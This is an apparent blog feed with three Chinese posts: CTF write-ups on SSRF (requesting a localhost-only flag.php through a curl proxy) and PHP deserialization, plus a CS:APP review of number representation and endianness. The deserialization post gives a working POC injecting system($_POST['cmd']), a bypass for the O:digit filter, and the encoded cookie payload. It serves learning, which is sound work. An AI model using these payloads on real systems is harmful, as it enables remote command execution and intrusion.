<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>xia0ji233&#39;s blog</title>
  
  <subtitle>学习应该像呼吸一样自然</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2022-06-17T12:23:01.523Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>xia0ji233</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ctfshow刷题记录-web351</title>
    <link href="http://example.com/2022/06/16/ctfshow%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-web351/"/>
    <id>http://example.com/2022/06/16/ctfshow%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-web351/</id>
    <published>2022-06-16T15:00:00.000Z</published>
    <updated>2022-06-17T12:23:01.523Z</updated>
    
    <content type="html"><![CDATA[<p>今天学学 <code>ssrf</code>，有些服务器的某些资源可能会规定请求必须来自内网才能访问资源，如果不是内网用户则会被拒，而 <code>ssrf</code> 就能为我们提供一个内网访问的通道。</p><span id="more"></span><h2 id="浅析ssrf"><a href="#浅析ssrf" class="headerlink" title="浅析ssrf"></a>浅析ssrf</h2><blockquote><p>在计算机安全中，服务器端请求伪造（英语：Server-side Request Forgery，简称SSRF）是攻击者滥用服务器功能来访问或操作无法被直接访问的信息的方式之一</p></blockquote><p>在之前做过的题目种，我们已经初步接触过本地网页限制访问资源的例子，但是我们都可以伪造，比如 <code>referer</code> 字段或者是 <code>X-Forwarded-for</code> 字段，因为包含在我们请求的 <code>headers</code> 中，因此我们可以直接伪造。但是 <code>$_SERVER</code> 就是我们所不能伪造的了，这个变量是什么呢？</p><blockquote><p>$_SERVER 是一个包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组。这个数组中的项目由 Web 服务器创建。不能保证每个服务器都提供全部项目；服务器可能会忽略一些，或者提供一些没有在这里列举出来的项目。这也就意味着大量的此类变量都会在<a href="http://www.faqs.org/rfcs/rfc3875">» CGI 1.1 规范</a>中说明，所以应该仔细研究一下。</p></blockquote><p>所以我们对 <code>SERVER</code> 变量进行校验即可判断请求是否来自本地，如果不来自本地则直接拒绝掉。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_ADDR&#x27;</span>]!==<span class="string">&#x27;127.0.0.1&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;非本地访问&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&#x27;flag&#123;test_flag&#125;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以发现是无法访问的。</p><p><img src="/2022/06/16/ctfshow%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-web351/1.png" alt="1"></p><p>只有我们在本机使用环回地址才能访问成功。</p><p><img src="/2022/06/16/ctfshow%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-web351/2.png" alt="2"></p><p>那么我们最主要就是如何让服务器代我们发起请求，如果能代我们发起请求，那就会造成给 <code>ssrf</code>。</p><h2 id="web351"><a href="#web351" class="headerlink" title="web351"></a>web351</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$ch</span>=curl_init(<span class="variable">$url</span>);</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">curl_close(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>一步一步解读。</p><p>第一个从 <code>url</code> 参数中获取 <code>url</code>。</p><ul><li><code>curl_init</code>：初始化一个 <code>cURL</code> 会话，参数可以为空，或者为一个 <code>url</code></li><li><code>curl_setopt</code>：设置 <code>cURL</code> 会话的一些属性。</li><li><code>curl_exec</code>：根据参数选项执行 <code>curl</code> 命令，并把结果返回给浏览器。</li><li><code>curl_close</code>：关闭会话</li></ul><p>就是直接可以请求一个网页，然后可以发现底下有 <code>flag.php</code>，但是只有本地能访问，因此在这里我们让 <code>curl</code> 去请求 <code>127.0.0.1/flag.php</code> 即可。</p><p><img src="/2022/06/16/ctfshow%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-web351/3.png" alt="3"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;今天学学 &lt;code&gt;ssrf&lt;/code&gt;，有些服务器的某些资源可能会规定请求必须来自内网才能访问资源，如果不是内网用户则会被拒，而 &lt;code&gt;ssrf&lt;/code&gt; 就能为我们提供一个内网访问的通道。&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="web" scheme="http://example.com/categories/ctf/web/"/>
    
    <category term="ssrf" scheme="http://example.com/categories/ctf/web/ssrf/"/>
    
    
  </entry>
  
  <entry>
    <title>ctfshow刷题记录-web258</title>
    <link href="http://example.com/2022/06/16/ctfshow%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-web258/"/>
    <id>http://example.com/2022/06/16/ctfshow%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-web258/</id>
    <published>2022-06-15T16:00:00.000Z</published>
    <updated>2022-06-15T17:54:32.503Z</updated>
    
    <content type="html"><![CDATA[<p>ctfshow的刷题记录-web258</p><span id="more"></span><p>反序列化寻思着多做点吧，反序列化主要就是写poc，去构造符合要求的对象。</p><h2 id="分析源码"><a href="#分析源码" class="headerlink" title="分析源码"></a>分析源码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class=<span class="keyword">new</span> info();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="keyword">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class-&gt;getInfo();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$user</span> = unserialize(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$user</span>-&gt;login(<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>通过读源码可以发现有一个 <code>backDoor</code> 类，它能让我们使用 <code>eval</code> 进行命令执行。采用cookie传入poc反序列化，我们让 <code>ctfShowUser</code> 这个 <code>class</code> 属性为 <code>backDoor</code> 的一个对象，并且 <code>code</code> 需要我们任意可才能进行命令执行，执行 <code>getinfo</code> 即可触发，在 <code>ctfShowUser</code> 类中的析构函数会调用执行，于是我们写出如下 <code>poc</code>。</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class=<span class="keyword">new</span> backDoor();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="keyword">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class-&gt;getInfo();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>=<span class="string">&#x27;system($_POST[&quot;cmd&quot;]);&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//eval($this-&gt;code);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> ctfShowUser();</span><br><span class="line"><span class="variable">$res</span>=serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span>(urlencode(<span class="variable">$res</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>写出poc之后还要注意，这里的 <code>poc</code> 不能有类似 <code>O:数字</code> 或者是 <code>C:数字</code> 的形式，并且无视大小写，那么我们需要绕过，通过在冒号后面加上一个 <code>+</code> 即可绕过，我们在反序列化对象时，可以加一个字符串替换，将 <code>O:</code> 替换为 <code>O:+</code>， <code>C:</code> 替换成 <code>C:+</code>，所以我们最终 <code>poc</code> 为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class=<span class="keyword">new</span> backDoor();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="keyword">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class-&gt;getInfo();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>=<span class="string">&#x27;system($_POST[&quot;cmd&quot;]);&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//eval($this-&gt;code);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> ctfShowUser();</span><br><span class="line"><span class="variable">$res</span>=serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$res</span>=str_replace(<span class="string">&#x27;O:&#x27;</span>,<span class="string">&#x27;O:+&#x27;</span>,<span class="variable">$res</span>);</span><br><span class="line"><span class="variable">$res</span>=str_replace(<span class="string">&#x27;C:&#x27;</span>,<span class="string">&#x27;C:+&#x27;</span>,<span class="variable">$res</span>);</span><br><span class="line"><span class="keyword">echo</span>(urlencode(<span class="variable">$res</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A%2B11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A0%3Bs%3A5%3A%22class%22%3BO%3A%2B8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A22%3A%22system%28%24_POST%5B%22cmd%22%5D%29%3B%22%3B%7D%7D</span><br></pre></td></tr></table></figure><p>我们在 <code>cookie</code> 的 <code>user</code> 字段中传入 <code>poc</code>，然后 <code>post</code> 给一个 <code>cmd</code> 参数作为命令执行。</p><p><img src="/2022/06/16/ctfshow%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-web258/1.png" alt="1"></p><p>发现 <code>flag.php</code>，我们 <code>cat /flag</code> 并且打开源代码发现 <code>flag</code>。</p><p><img src="/2022/06/16/ctfshow%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-web258/2.png" alt="2"></p><p>这里主要还得注意 <code>url</code> 编码传入，因为 <code>cookie</code> 以 <code>;</code> 作为分割符号。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;ctfshow的刷题记录-web258&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="web" scheme="http://example.com/categories/ctf/web/"/>
    
    <category term="unserialize" scheme="http://example.com/categories/ctf/web/unserialize/"/>
    
    
  </entry>
  
  <entry>
    <title>CS:APP第二章复习</title>
    <link href="http://example.com/2022/06/03/CSAPP_Datalab/"/>
    <id>http://example.com/2022/06/03/CSAPP_Datalab/</id>
    <published>2022-06-03T11:00:00.000Z</published>
    <updated>2022-06-03T07:58:13.507Z</updated>
    
    <content type="html"><![CDATA[<p>之前 <code>CS:APP</code> 没有好好学，今天下定决心来重新看一遍，并把实验好好做一遍以巩固自身。</p><span id="more"></span><h2 id="信息存储"><a href="#信息存储" class="headerlink" title="信息存储"></a>信息存储</h2><h3 id="数字表示"><a href="#数字表示" class="headerlink" title="数字表示"></a>数字表示</h3><p>二进制：区别于我们平时计数使用的十进制，二进制使用的是逢二进一原则，而我们的十进制则是逢十进一，比如我们十进制的 <code>9+1</code> 中的 <code>9</code>，答案应该是十，但是十应该进一，因此得出了我们常规的答案 <code>10</code>。在二进制里面，每一位只要大于等于 <code>2</code> 则都要向高位进一。为了方便表示，还衍生出了二进制的子类，比如八进制，十六进制等，主要是二进制向这R</p><p>些进制转换较为容易，而计算机平时又都处理二进制数据，因此就出现了这些常见的进制计数。</p><h3 id="信息存储-1"><a href="#信息存储-1" class="headerlink" title="信息存储"></a>信息存储</h3><p>大多数计算机使用的都是8位（在计算机中，除特殊说明外，一位均指的是二进制的位）的块，或者叫字节，字节是作为计算机可寻址的最小单位。一般来说我们并不习惯于将一个字节写成八位二进制的数，而是会写成两位十六进制的数。十六进制与二进制之间的转换也会十分容易，举个例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x99-&gt;0b10011001</span><br><span class="line">0x88-&gt;0b10001000</span><br></pre></td></tr></table></figure><p>我们可以发现我们并不用像十进制那样权值相加或者是除二取余那么麻烦，我们把一位十六进制视为四位二进制即可，这样我们在转换的时候就是直接每一位分别转了，可以看出十分的方便。</p><h4 id="字数据大小"><a href="#字数据大小" class="headerlink" title="字数据大小"></a>字数据大小</h4><p>每台计算机都有一个字长，字长为计算机 <code>CPU</code> 一次能处理的最大数据，也有一种说法是能表示的最大内存。其实意思是差不多的，比如我们都知道 <code>32</code> 位的计算机最多能装 <code>4GB</code> 的内存，再多它也是只能使用这么多的内存，那是因为 <code>CPU</code> 要访问内存的时候，也只能使用一个 <code>32</code> 位的数据来表示地址，32位的数能表示的数的个数也就是 <code>2^32</code> 这么多，而地址指示的单位是字节，所以最多就是 <code>2^32</code> 字节，那就是熟知的 <code>4GB</code> 了。</p><p><code>C</code> 语言中  <code>sizeof()</code> 会返回一个对象所占的字节数，我们对比输出下 <code>32</code> 位机子和 <code>64</code> 位机子的各个基本数据类型所占的字节数。我们不必找两个机子，只需要在 <code>64</code> 位的机子上分别编译 <code>32</code> 位和 <code>64</code> 位的程序即可。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;char:%d\n&quot;</span>,<span class="keyword">sizeof</span>(<span class="keyword">char</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;short:%d\n&quot;</span>,<span class="keyword">sizeof</span>(<span class="keyword">short</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;int:%d\n&quot;</span>,<span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;long:%d\n&quot;</span>,<span class="keyword">sizeof</span>(<span class="keyword">long</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;char *:%d\n&quot;</span>,<span class="keyword">sizeof</span>(<span class="keyword">char</span> *));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;float:%d\n&quot;</span>,<span class="keyword">sizeof</span>(<span class="keyword">float</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;double:%d\n&quot;</span>,<span class="keyword">sizeof</span>(<span class="keyword">double</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>32 </code>位的结果：</p><p><img src="/2022/06/03/CSAPP_Datalab/1.png" alt="1"></p><p><code>64</code> 位的结果：</p><p><img src="/2022/06/03/CSAPP_Datalab/2.png" alt="2">    </p><p>我们总结出如下表格</p><table><thead><tr><th>C声明</th><th>32位字节数</th><th>64位字节数</th></tr></thead><tbody><tr><td>char</td><td>1</td><td>1</td></tr><tr><td>short</td><td>2</td><td>2</td></tr><tr><td>int</td><td>4</td><td>4</td></tr><tr><td>long</td><td>4</td><td>4</td></tr><tr><td>char *</td><td>4</td><td>8</td></tr><tr><td>float</td><td>4</td><td>4</td></tr><tr><td>double</td><td>8</td><td>8</td></tr></tbody></table><p>其实有些时候， <code>long</code> 的字节数也会随机器字长有所变化的，只是好像某个版本区分了 <code>64</code> 位整数就叫 <code>long long</code> 而 <code>long</code> 地位与 <code>int</code> 一致了。但是除了这个问题，可以发现只有指针类型的数据会随着机器字长发生变化，这也如我们所说，机器字长决定了指针就多少位，决定了有多少个地址，能用多少内存，多出的内存机器就无法做区分了。</p><h3 id="寻址和字节顺序"><a href="#寻址和字节顺序" class="headerlink" title="寻址和字节顺序"></a>寻址和字节顺序</h3><p>对于多字节的数据类型我们必须确定两点：</p><ol><li>这个对象地址在哪里</li><li>这个对象中的字节按什么顺序排列</li></ol><p>比如一个 <code>int</code> 它有四个字节，那么我定义 <code>int a=0x12345678</code>。首先它一定是连续排列的，因此我们确定一个 <code>int</code> 的地址只需要确定它的最高字节的位置即可确定整个 <code>int</code> 的位置。假如 <code>int</code> 的地址是在 <code>0x100</code> 的，那么它应该怎么排列这些字节呢？</p><p>我们最初可能按照惯性，认为它是按照如下方式存储的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">字节：12  34  56  78</span><br><span class="line">地址：100 101 102 103</span><br></pre></td></tr></table></figure><p>这个也很符合我们的书写规则，但是实时却恰恰相反，在现在大部分的机器中，它是反着存储的。也就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">字节：78  56  34  12</span><br><span class="line">地址：100 101 102 103</span><br></pre></td></tr></table></figure><p>这两种存储方式我们分别叫大端序和小端序。</p><ul><li><p>大端序：最高有效字节在低地址</p></li><li><p>小端序：最高有效字节在高地址</p></li></ul><p>在我们书写汇编语言的时候，要写一个值通常也是以小端序的方式书写的。</p><p>比如我给 <code>eax</code> 寄存器加上 <code>0x12345678</code> 你会发现它的字节码是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov    $0x12345678,%eax </span><br><span class="line">b8 78 56 34 12</span><br></pre></td></tr></table></figure><p>我们通过定义以下的函数以十六进制来逐个显示内存中的字节。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show_bytes</span><span class="params">(<span 